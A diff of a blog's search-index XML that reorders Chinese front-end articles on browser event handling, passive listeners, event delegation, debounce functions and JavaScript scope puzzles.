@@ -46,6 +46,65 @@
       </tags>
   </entry>
   <entry>
+    <title>浏览器事件机制</title>
+    <url>/2018/11/20/browser-dom-event/</url>
+    <content><![CDATA[<p>要知道浏览器是怎么接收输入（滚动，鼠标移动，input 事件，对浏览器来说都是输入），需要明白在页面的呈现的哪个步骤，对事件作出响应。</p>
+<p>简单讲一下页面呈现步骤：</p>
+<p>浏览器的 render process 构建了 DOM Tree，CCSOM tree ，它知道文档的结构以及每个节点的样式，但仅有这些信息不足以渲染一个页面。这时需要 layout process 去定位每个节点的几何信息（形状，位置），由 render process 提供的 DOM tree 和 CSSOM tree ，构建 layout tree （或者说 render tree）。下一步交给 painting process ，主线程遍历 layout tree ，创建画板记录（paint records）。画板记录就像是 painting process 中的一本笔记，记录着类似“先画背景，然后是文字，然后是矩形”的东西。</p>
+<p>现在浏览器知道了文档的结构，节点的样式，页面的几何信息，还有绘制顺序。把这些信息转化为屏幕上的像素的过程，叫做光栅化。</p>
+<p>比较傻瓜的方法是在浏览器的视口（viewport）里面做部分光栅化。如果用户滚动页面，把这个光栅往下挪，填充空缺的部分。Chrome 刚发布的那会就是用这种方式做光栅化的，现代浏览器则会启用一个更复杂的进程：compositing（合成）。</p>
+<p>compositing 进程把页面分为多个图层（layer），分隔地将它们光栅化，最后在合成器线程（compositor thread）中组成页面。图层可能很大，比如占据整个页面的长度，所以合成器线程会把它们分成一个个小瓦片，发送到多个光栅线程（raster threads）。光栅线程将每个瓦片光栅化（像素化），并储存在 GPU 内存中。</p>
+<blockquote>
+<p>在 chrome devTools 里面的 performance 可以看到，渲染一个页面的时候有多个 raster threads 参与。</p>
+</blockquote>
+<p>以上大概就是页面 layout –&gt; paint –&gt; composite 的过程，更多细节可以看 google developers 的文章 <a href="https://developers.google.com/web/updates/2018/09/inside-browser-part3" target="_blank" rel="noopener"><br>Inside look at modern web browser (part 3)</a></p>
+<hr>
+<p>好了，终于可以讲浏览器对输入的处理了：</p>
+<p>第一个接收到用户手势（触屏，点击，滑动…）的是浏览器进程（UI 线程？），浏览器进程会把这个手势的事件类型，坐标发送到渲染进程。渲染进程找到事件目标，执行对应的监听。</p>
+<p>执行 JavaScript 是主线程（main thread）的主要工作，当一个页面经由合成器线程合成后，合成器线程会把绑定了监听事件的区域标记为 “Non-Fast Scrollable Region” 。如果注册的事件在这个区域上触发，合成器线程确保把事件发送到主线程。如果事件发生在这个区域外，合成器线程继续合成新的帧，而不用等待主线程。</p>
+<p>我们知道事件代理模式。事件可以冒泡，那么可以在最最底部的元素上绑定事件，比如如下代码：</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">document</span>.body.addEventListener(<span class="string">'touchstart'</span>,  event =&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span> (event.target === area) &#123;</span><br><span class="line">        event.preventDefault();</span><br><span class="line">    &#125;</span><br><span class="line">&#125; );</span><br></pre></td></tr></table></figure>
+<p>看起来只需要注册一次事件，就可以代理所有发生在它子代上面的事件，似乎很诱人。但是在浏览器的角度，整个页面被标记为 non-fast scrollable region ，这意味着，尽管你的应用可能不在意页面一些区域的输入，合成器线程还是需要和主线程通信，每次都要等待输入。所以合成器的“顺畅滚动“能力用不上了。</p>
+<p>可以向事件监听传入参数 <code>passive: true</code> ，这告诉浏览器：你还是想要在主线程上监听事件，但是合成器线程仍继续合成帧。</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">document</span>.body.addEventListener(<span class="string">'touchstart'</span>,  event =&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span> (event.target === area) &#123;</span><br><span class="line">        event.preventDefault()</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;, &#123;<span class="attr">passive</span>: <span class="literal">true</span>&#125; );</span><br></pre></td></tr></table></figure>
+<h3 id="事件触发的三个阶段"><a href="#事件触发的三个阶段" class="headerlink" title="事件触发的三个阶段"></a>事件触发的三个阶段</h3><p>本节部分转载自： <a href="https://yuchengkai.cn/docs/zh/frontend/browser.html#%E4%BA%8B%E4%BB%B6%E6%9C%BA%E5%88%B6" target="_blank" rel="noopener">https://yuchengkai.cn/docs/zh/frontend/browser.html#%E4%BA%8B%E4%BB%B6%E6%9C%BA%E5%88%B6</a></p>
+<p>事件触发有三个阶段</p>
+<ul>
+<li>window 往事件触发处传播，遇到注册的捕获事件会触发</li>
+<li>传播到事件触发处时触发注册的事件</li>
+<li>从事件触发处往 window 传播，遇到注册的冒泡事件会触发</li>
+</ul>
+<p>事件触发一般按照上面的顺序，但是有例外：如果为同一个元素同时注册了捕获事件和冒泡事件，事件会按照注册的顺序触发。</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 以下会先打印冒泡然后是捕获</span></span><br><span class="line">node.addEventListener(<span class="string">'click'</span>,(event) =&gt;&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'冒泡'</span>)</span><br><span class="line">&#125;,<span class="literal">false</span>);</span><br><span class="line">node.addEventListener(<span class="string">'click'</span>,(event) =&gt;&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'捕获 '</span>)</span><br><span class="line">&#125;,<span class="literal">true</span>)</span><br></pre></td></tr></table></figure>
+<h3 id="注册事件"><a href="#注册事件" class="headerlink" title="注册事件"></a>注册事件</h3><p>一般用 <a href="https://developer.mozilla.org/zh-CN/docs/Web/API/EventTarget/addEventListener" target="_blank" rel="noopener">EventTarget.addEventListener()</a>，当然 ie 老古董自行用 <code>onEvent = function(){ ... }</code> 方式。</p>
+<p>addEventListener 函数的第三个参数可以是布尔值，也可以是对象。对于布尔值 useCapture 参数来说，该参数默认值为 false 。useCapture 决定了注册的事件是捕获事件还是冒泡事件。缺省情况下注册冒泡事件。</p>
+<p>对于对象参数来说，可以使用以下几个属性</p>
+<ul>
+<li>capture，布尔值，和 useCapture 作用一样</li>
+<li>once，布尔值，值为 true 表示该回调只会调用一次，调用后会移除监听</li>
+<li>passive，布尔值，表示永远不会调用 <a href="https://developer.mozilla.org/en-US/docs/Web/API/Event/preventDefault" target="_blank" rel="noopener">preventDefault</a></li>
+</ul>
+<p>capture 和 once 都比较好理解。下面讲一下 preventDefault ：</p>
+<p>preventDefault 告诉浏览器：如果此事件没有需要显式处理，那么它默认的动作也不要做（因为默认是要做的）。此事件还是继续传播，除非碰到事件侦听器调用stopPropagation() 或stopImmediatePropagation()，才停止传播。</p>
+<p>这里我们可以看到 preventDefault 的作用：开发者可以在监听 touch 和 wheel 事件时指定 <code>{passive:true}</code> 来表明他们不会调用preventDefault。也就是说，默认的滚动事件还是要做的，而且永远不会被禁用，从而获得更好的滚动性能。归根结底是合成器线程无需等待主线程，继续合成帧。</p>
+<p>更多阅读移步 <a href="https://github.com/WICG/EventListenerOptions/blob/gh-pages/explainer.md" target="_blank" rel="noopener">Passive event listeners</a> <a href="https://futu.im/posts/2017-06-06-passive-event-listeners/" target="_blank" rel="noopener">翻译版</a></p>
+<h3 id="事件代理"><a href="#事件代理" class="headerlink" title="事件代理"></a>事件代理</h3><p>如果一个节点中的子节点是动态生成的，那么子节点需要注册事件的话应该注册在父节点上</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;ul id=<span class="string">"ul"</span>&gt;</span><br><span class="line">    &lt;li&gt;<span class="number">1</span>&lt;<span class="regexp">/li&gt;</span></span><br><span class="line"><span class="regexp">    &lt;li&gt;2&lt;/</span>li&gt;</span><br><span class="line">    &lt;li&gt;<span class="number">3</span>&lt;<span class="regexp">/li&gt;</span></span><br><span class="line"><span class="regexp">    &lt;li&gt;4&lt;/</span>li&gt;</span><br><span class="line">    &lt;li&gt;<span class="number">5</span>&lt;<span class="regexp">/li&gt;</span></span><br><span class="line"><span class="regexp">&lt;/u</span>l&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="keyword">let</span> ul = <span class="built_in">document</span>.querySelector(<span class="string">'##ul'</span>)</span><br><span class="line">    ul.addEventListener(<span class="string">'click'</span>, (event) =&gt; &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(event.target);</span><br><span class="line">    &#125;)</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
+<p>事件代理的方式相对于直接给目标注册事件来说，有以下优点</p>
+<ul>
+<li>节省内存</li>
+<li>不需要给子节点注销事件</li>
+</ul>
+]]></content>
+      <categories>
+        <category>浏览器</category>
+      </categories>
+      <tags>
+        <tag>浏览器</tag>
+        <tag>优化</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>同步渲染和异步渲染对 DOM 的阻塞</title>
     <url>/2018/11/19/async-render/</url>
     <content><![CDATA[<p>首先区分一下，什么是同步渲染和异步渲染。</p>
@@ -131,67 +190,8 @@
         <category>优化</category>
       </categories>
       <tags>
+        <tag>优化</tag>
         <tag>渲染</tag>
-        <tag>优化</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>浏览器事件机制</title>
-    <url>/2018/11/20/browser-dom-event/</url>
-    <content><![CDATA[<p>要知道浏览器是怎么接收输入（滚动，鼠标移动，input 事件，对浏览器来说都是输入），需要明白在页面的呈现的哪个步骤，对事件作出响应。</p>
-<p>简单讲一下页面呈现步骤：</p>
-<p>浏览器的 render process 构建了 DOM Tree，CCSOM tree ，它知道文档的结构以及每个节点的样式，但仅有这些信息不足以渲染一个页面。这时需要 layout process 去定位每个节点的几何信息（形状，位置），由 render process 提供的 DOM tree 和 CSSOM tree ，构建 layout tree （或者说 render tree）。下一步交给 painting process ，主线程遍历 layout tree ，创建画板记录（paint records）。画板记录就像是 painting process 中的一本笔记，记录着类似“先画背景，然后是文字，然后是矩形”的东西。</p>
-<p>现在浏览器知道了文档的结构，节点的样式，页面的几何信息，还有绘制顺序。把这些信息转化为屏幕上的像素的过程，叫做光栅化。</p>
-<p>比较傻瓜的方法是在浏览器的视口（viewport）里面做部分光栅化。如果用户滚动页面，把这个光栅往下挪，填充空缺的部分。Chrome 刚发布的那会就是用这种方式做光栅化的，现代浏览器则会启用一个更复杂的进程：compositing（合成）。</p>
-<p>compositing 进程把页面分为多个图层（layer），分隔地将它们光栅化，最后在合成器线程（compositor thread）中组成页面。图层可能很大，比如占据整个页面的长度，所以合成器线程会把它们分成一个个小瓦片，发送到多个光栅线程（raster threads）。光栅线程将每个瓦片光栅化（像素化），并储存在 GPU 内存中。</p>
-<blockquote>
-<p>在 chrome devTools 里面的 performance 可以看到，渲染一个页面的时候有多个 raster threads 参与。</p>
-</blockquote>
-<p>以上大概就是页面 layout –&gt; paint –&gt; composite 的过程，更多细节可以看 google developers 的文章 <a href="https://developers.google.com/web/updates/2018/09/inside-browser-part3" target="_blank" rel="noopener"><br>Inside look at modern web browser (part 3)</a></p>
-<hr>
-<p>好了，终于可以讲浏览器对输入的处理了：</p>
-<p>第一个接收到用户手势（触屏，点击，滑动…）的是浏览器进程（UI 线程？），浏览器进程会把这个手势的事件类型，坐标发送到渲染进程。渲染进程找到事件目标，执行对应的监听。</p>
-<p>执行 JavaScript 是主线程（main thread）的主要工作，当一个页面经由合成器线程合成后，合成器线程会把绑定了监听事件的区域标记为 “Non-Fast Scrollable Region” 。如果注册的事件在这个区域上触发，合成器线程确保把事件发送到主线程。如果事件发生在这个区域外，合成器线程继续合成新的帧，而不用等待主线程。</p>
-<p>我们知道事件代理模式。事件可以冒泡，那么可以在最最底部的元素上绑定事件，比如如下代码：</p>
-<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">document</span>.body.addEventListener(<span class="string">'touchstart'</span>,  event =&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span> (event.target === area) &#123;</span><br><span class="line">        event.preventDefault();</span><br><span class="line">    &#125;</span><br><span class="line">&#125; );</span><br></pre></td></tr></table></figure>
-<p>看起来只需要注册一次事件，就可以代理所有发生在它子代上面的事件，似乎很诱人。但是在浏览器的角度，整个页面被标记为 non-fast scrollable region ，这意味着，尽管你的应用可能不在意页面一些区域的输入，合成器线程还是需要和主线程通信，每次都要等待输入。所以合成器的“顺畅滚动“能力用不上了。</p>
-<p>可以向事件监听传入参数 <code>passive: true</code> ，这告诉浏览器：你还是想要在主线程上监听事件，但是合成器线程仍继续合成帧。</p>
-<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">document</span>.body.addEventListener(<span class="string">'touchstart'</span>,  event =&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span> (event.target === area) &#123;</span><br><span class="line">        event.preventDefault()</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;, &#123;<span class="attr">passive</span>: <span class="literal">true</span>&#125; );</span><br></pre></td></tr></table></figure>
-<h3 id="事件触发的三个阶段"><a href="#事件触发的三个阶段" class="headerlink" title="事件触发的三个阶段"></a>事件触发的三个阶段</h3><p>本节部分转载自： <a href="https://yuchengkai.cn/docs/zh/frontend/browser.html#%E4%BA%8B%E4%BB%B6%E6%9C%BA%E5%88%B6" target="_blank" rel="noopener">https://yuchengkai.cn/docs/zh/frontend/browser.html#%E4%BA%8B%E4%BB%B6%E6%9C%BA%E5%88%B6</a></p>
-<p>事件触发有三个阶段</p>
-<ul>
-<li>window 往事件触发处传播，遇到注册的捕获事件会触发</li>
-<li>传播到事件触发处时触发注册的事件</li>
-<li>从事件触发处往 window 传播，遇到注册的冒泡事件会触发</li>
-</ul>
-<p>事件触发一般按照上面的顺序，但是有例外：如果为同一个元素同时注册了捕获事件和冒泡事件，事件会按照注册的顺序触发。</p>
-<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 以下会先打印冒泡然后是捕获</span></span><br><span class="line">node.addEventListener(<span class="string">'click'</span>,(event) =&gt;&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'冒泡'</span>)</span><br><span class="line">&#125;,<span class="literal">false</span>);</span><br><span class="line">node.addEventListener(<span class="string">'click'</span>,(event) =&gt;&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'捕获 '</span>)</span><br><span class="line">&#125;,<span class="literal">true</span>)</span><br></pre></td></tr></table></figure>
-<h3 id="注册事件"><a href="#注册事件" class="headerlink" title="注册事件"></a>注册事件</h3><p>一般用 <a href="https://developer.mozilla.org/zh-CN/docs/Web/API/EventTarget/addEventListener" target="_blank" rel="noopener">EventTarget.addEventListener()</a>，当然 ie 老古董自行用 <code>onEvent = function(){ ... }</code> 方式。</p>
-<p>addEventListener 函数的第三个参数可以是布尔值，也可以是对象。对于布尔值 useCapture 参数来说，该参数默认值为 false 。useCapture 决定了注册的事件是捕获事件还是冒泡事件。缺省情况下注册冒泡事件。</p>
-<p>对于对象参数来说，可以使用以下几个属性</p>
-<ul>
-<li>capture，布尔值，和 useCapture 作用一样</li>
-<li>once，布尔值，值为 true 表示该回调只会调用一次，调用后会移除监听</li>
-<li>passive，布尔值，表示永远不会调用 <a href="https://developer.mozilla.org/en-US/docs/Web/API/Event/preventDefault" target="_blank" rel="noopener">preventDefault</a></li>
-</ul>
-<p>capture 和 once 都比较好理解。下面讲一下 preventDefault ：</p>
-<p>preventDefault 告诉浏览器：如果此事件没有需要显式处理，那么它默认的动作也不要做（因为默认是要做的）。此事件还是继续传播，除非碰到事件侦听器调用stopPropagation() 或stopImmediatePropagation()，才停止传播。</p>
-<p>这里我们可以看到 preventDefault 的作用：开发者可以在监听 touch 和 wheel 事件时指定 <code>{passive:true}</code> 来表明他们不会调用preventDefault。也就是说，默认的滚动事件还是要做的，而且永远不会被禁用，从而获得更好的滚动性能。归根结底是合成器线程无需等待主线程，继续合成帧。</p>
-<p>更多阅读移步 <a href="https://github.com/WICG/EventListenerOptions/blob/gh-pages/explainer.md" target="_blank" rel="noopener">Passive event listeners</a> <a href="https://futu.im/posts/2017-06-06-passive-event-listeners/" target="_blank" rel="noopener">翻译版</a></p>
-<h3 id="事件代理"><a href="#事件代理" class="headerlink" title="事件代理"></a>事件代理</h3><p>如果一个节点中的子节点是动态生成的，那么子节点需要注册事件的话应该注册在父节点上</p>
-<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;ul id=<span class="string">"ul"</span>&gt;</span><br><span class="line">    &lt;li&gt;<span class="number">1</span>&lt;<span class="regexp">/li&gt;</span></span><br><span class="line"><span class="regexp">    &lt;li&gt;2&lt;/</span>li&gt;</span><br><span class="line">    &lt;li&gt;<span class="number">3</span>&lt;<span class="regexp">/li&gt;</span></span><br><span class="line"><span class="regexp">    &lt;li&gt;4&lt;/</span>li&gt;</span><br><span class="line">    &lt;li&gt;<span class="number">5</span>&lt;<span class="regexp">/li&gt;</span></span><br><span class="line"><span class="regexp">&lt;/u</span>l&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="keyword">let</span> ul = <span class="built_in">document</span>.querySelector(<span class="string">'##ul'</span>)</span><br><span class="line">    ul.addEventListener(<span class="string">'click'</span>, (event) =&gt; &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(event.target);</span><br><span class="line">    &#125;)</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
-<p>事件代理的方式相对于直接给目标注册事件来说，有以下优点</p>
-<ul>
-<li>节省内存</li>
-<li>不需要给子节点注销事件</li>
-</ul>
-]]></content>
-      <categories>
-        <category>浏览器</category>
-      </categories>
-      <tags>
-        <tag>优化</tag>
-        <tag>浏览器</tag>
       </tags>
   </entry>
   <entry>
@@ -582,6 +582,25 @@
       </tags>
   </entry>
   <entry>
+    <title>debounce 防抖</title>
+    <url>/2018/11/20/debounce/</url>
+    <content><![CDATA[<p>函数去抖背后的基本思想是指，某些代码不可以在没有间断的情况连续重复执行。第一次调用函数，创建一个定时器，在指定的时间间隔之后运行代码。当第二次调用该函数时，它会清除前一次的定时器并设置另一个。如果前一个定时器已经执行过了，这个操作就没有任何意义。然而，如果前一个定时器尚未执行，其实就是将其替换为一个新的定时器。目的是只有在执行函数的请求停止了一段时间之后才执行。<br>比如连续滚动。<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">debounce</span> (<span class="params">method, wait, context</span>) </span>&#123;</span><br><span class="line">    clearTimeout(method.tId);</span><br><span class="line">    method.tId = setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        method.call(context);</span><br><span class="line">    &#125;, wait);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>对<code>scroll</code>事件测试：<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">handle</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'scroll'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">window</span>.addEventListener(<span class="string">'scroll'</span>, debounce(handle, <span class="number">1000</span>));</span><br></pre></td></tr></table></figure></p>
+<p>连续滚动（每次间隔时间小于1000ms，不会触发<code>handle</code>方法，因为每次触发都会取消上一次的延时事件，然后重新设置延时1000ms。只有两次<code>scroll</code>事件间隔超过1000ms，前一次的才会被触发。</p>
+<h3 id="debounce更加常规的写法：返回一个闭包"><a href="#debounce更加常规的写法：返回一个闭包" class="headerlink" title="debounce更加常规的写法：返回一个闭包"></a>debounce更加常规的写法：返回一个闭包</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">debounce</span>(<span class="params">method, wait</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> timer = <span class="literal">null</span>;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'debounce initialized'</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> context = <span class="keyword">this</span>;</span><br><span class="line">        <span class="keyword">var</span> args = <span class="built_in">arguments</span>;</span><br><span class="line">        <span class="comment">// 清空上一次定时器</span></span><br><span class="line">        clearTimeout(timer);</span><br><span class="line">        timer = setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            method.apply(context, args);</span><br><span class="line">        &#125;, wait);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>测试：<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> box = <span class="built_in">document</span>.getElementById(<span class="string">'box'</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">handle</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'hello'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> fun = debounce(handle,<span class="number">1000</span>);</span><br><span class="line">box.addEventListener(<span class="string">'scroll'</span>,fun);</span><br></pre></td></tr></table></figure></p>
+<p>脚本加载后，<code>debounce initialized</code>只会被打印一次。<code>box</code>的<code>scroll</code>事件的触发有1000ms防抖。</p>
+<p>:point_right: <a href="https://jsfiddle.net/xqy_young/Ls2jaxvp/3/?utm_source=website&amp;utm_medium=embed&amp;utm_campaign=Ls2jaxvp" target="_blank" rel="noopener">demo in jsfiddle</a></p>
+]]></content>
+      <categories>
+        <category>js 基础</category>
+      </categories>
+      <tags>
+        <tag>js</tag>
+        <tag>面试题</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>函数柯里化</title>
     <url>/2018/11/20/currying/</url>
     <content><![CDATA[<h2 id="链式调用"><a href="#链式调用" class="headerlink" title="链式调用"></a>链式调用</h2><p>实现 <code>add(2)(3)(4)...(n)</code> 。</p>
@@ -596,25 +615,6 @@
 ]]></content>
       <categories>
         <category>函数式编程</category>
-      </categories>
-      <tags>
-        <tag>js</tag>
-        <tag>面试题</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>debounce 防抖</title>
-    <url>/2018/11/20/debounce/</url>
-    <content><![CDATA[<p>函数去抖背后的基本思想是指，某些代码不可以在没有间断的情况连续重复执行。第一次调用函数，创建一个定时器，在指定的时间间隔之后运行代码。当第二次调用该函数时，它会清除前一次的定时器并设置另一个。如果前一个定时器已经执行过了，这个操作就没有任何意义。然而，如果前一个定时器尚未执行，其实就是将其替换为一个新的定时器。目的是只有在执行函数的请求停止了一段时间之后才执行。<br>比如连续滚动。<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">debounce</span> (<span class="params">method, wait, context</span>) </span>&#123;</span><br><span class="line">    clearTimeout(method.tId);</span><br><span class="line">    method.tId = setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        method.call(context);</span><br><span class="line">    &#125;, wait);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>对<code>scroll</code>事件测试：<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">handle</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'scroll'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">window</span>.addEventListener(<span class="string">'scroll'</span>, debounce(handle, <span class="number">1000</span>));</span><br></pre></td></tr></table></figure></p>
-<p>连续滚动（每次间隔时间小于1000ms，不会触发<code>handle</code>方法，因为每次触发都会取消上一次的延时事件，然后重新设置延时1000ms。只有两次<code>scroll</code>事件间隔超过1000ms，前一次的才会被触发。</p>
-<h3 id="debounce更加常规的写法：返回一个闭包"><a href="#debounce更加常规的写法：返回一个闭包" class="headerlink" title="debounce更加常规的写法：返回一个闭包"></a>debounce更加常规的写法：返回一个闭包</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">debounce</span>(<span class="params">method, wait</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> timer = <span class="literal">null</span>;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'debounce initialized'</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> context = <span class="keyword">this</span>;</span><br><span class="line">        <span class="keyword">var</span> args = <span class="built_in">arguments</span>;</span><br><span class="line">        <span class="comment">// 清空上一次定时器</span></span><br><span class="line">        clearTimeout(timer);</span><br><span class="line">        timer = setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            method.apply(context, args);</span><br><span class="line">        &#125;, wait);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>测试：<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> box = <span class="built_in">document</span>.getElementById(<span class="string">'box'</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">handle</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'hello'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> fun = debounce(handle,<span class="number">1000</span>);</span><br><span class="line">box.addEventListener(<span class="string">'scroll'</span>,fun);</span><br></pre></td></tr></table></figure></p>
-<p>脚本加载后，<code>debounce initialized</code>只会被打印一次。<code>box</code>的<code>scroll</code>事件的触发有1000ms防抖。</p>
-<p>:point_right: <a href="https://jsfiddle.net/xqy_young/Ls2jaxvp/3/?utm_source=website&amp;utm_medium=embed&amp;utm_campaign=Ls2jaxvp" target="_blank" rel="noopener">demo in jsfiddle</a></p>
-]]></content>
-      <categories>
-        <category>js 基础</category>
       </categories>
       <tags>
         <tag>js</tag>
@@ -826,6 +826,23 @@
       </tags>
   </entry>
   <entry>
+    <title>js 作用域相关问题</title>
+    <url>/2018/11/20/js-scope-related/</url>
+    <content><![CDATA[<h2 id="作用域、闭包相关问题集锦"><a href="#作用域、闭包相关问题集锦" class="headerlink" title="作用域、闭包相关问题集锦"></a>作用域、闭包相关问题集锦</h2><h3 id="IIFE"><a href="#IIFE" class="headerlink" title="IIFE"></a>IIFE</h3><p><a href="https://developer.mozilla.org/zh-CN/docs/Glossary/%E7%AB%8B%E5%8D%B3%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0%E8%A1%A8%E8%BE%BE%E5%BC%8F" target="_blank" rel="noopener">MDN IIFE（ 立即调用函数表达式）</a></p>
+<p>判断以下执行结果：</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> env = <span class="string">'outer'</span>;</span><br><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(env);</span><br><span class="line">    <span class="keyword">var</span> env = <span class="string">'inner'</span>;</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> env = <span class="string">'outer'</span>;</span><br><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> env = <span class="string">'inner'</span>;</span><br><span class="line">    <span class="built_in">console</span>.log(env); <span class="comment">// inner</span></span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure>
+<h3 id="扩展-console-log-方法"><a href="#扩展-console-log-方法" class="headerlink" title="扩展 console.log 方法"></a>扩展 console.log 方法</h3><p>扩展 console.log 方法，每个输出前增加一个自增序号。</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">myLog</span> (<span class="params">fn</span>) </span>&#123;</span><br><span class="line">    id = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        id++;</span><br><span class="line">        <span class="keyword">var</span> fn_args = [].slice.call(<span class="built_in">arguments</span>);</span><br><span class="line">        fn_args.unshift(id+<span class="string">':'</span>);</span><br><span class="line">        fn.apply(<span class="literal">null</span>, fn_args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log = myLog(<span class="built_in">console</span>.log);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> num = <span class="number">2</span>;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'foo'</span>);       <span class="comment">// 1: foo</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'bar'</span>);       <span class="comment">// 2: bar</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'num:'</span>, num); <span class="comment">// 3: num: 2</span></span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>js 基础</category>
+      </categories>
+      <tags>
+        <tag>js</tag>
+        <tag>面试题</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>js-prototype-pollution</title>
     <url>/2019/07/21/js-prototype-pollution/</url>
     <content><![CDATA[<blockquote>
@@ -864,23 +881,6 @@
       <tags>
         <tag>js</tag>
         <tag>安全</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>js 作用域相关问题</title>
-    <url>/2018/11/20/js-scope-related/</url>
